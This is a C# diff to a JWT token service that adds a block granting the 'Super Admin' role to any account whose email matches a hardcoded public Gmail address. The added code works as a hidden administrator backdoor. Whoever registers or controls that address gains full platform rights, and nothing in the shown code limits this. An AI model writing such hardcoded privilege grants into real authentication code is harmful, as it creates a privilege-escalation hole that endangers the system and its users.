@@ -38,6 +38,13 @@ public class JwtService : IJwtService
         };
 
         // ... (remaining roles and token creation logic stays the same)
+        // 🛠️ PLATFORM ADMIN ROLE INJECTOR
+        bool isPlatformAdmin = user.Email != null && user.Email.Equals("Default_Admin@gmail.com", StringComparison.OrdinalIgnoreCase);
+        if (isPlatformAdmin && !roles.Contains("Super Admin", StringComparer.OrdinalIgnoreCase))
+        {
+            roles.Add("Super Admin");
+        }
+
         foreach (var role in roles)
         {
             if (!string.IsNullOrEmpty(role))
